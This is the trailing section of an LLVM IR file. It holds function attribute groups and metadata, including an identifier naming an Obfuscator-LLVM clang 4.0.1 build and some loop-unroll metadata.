attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146842976}
!2 = !{i32 -2146842567}
!3 = distinct !{!3, !4}
!4 = !{!"llvm.loop.unroll.disable"}
!5 = distinct !{!5, !4}
!6 = distinct !{!6, !4}
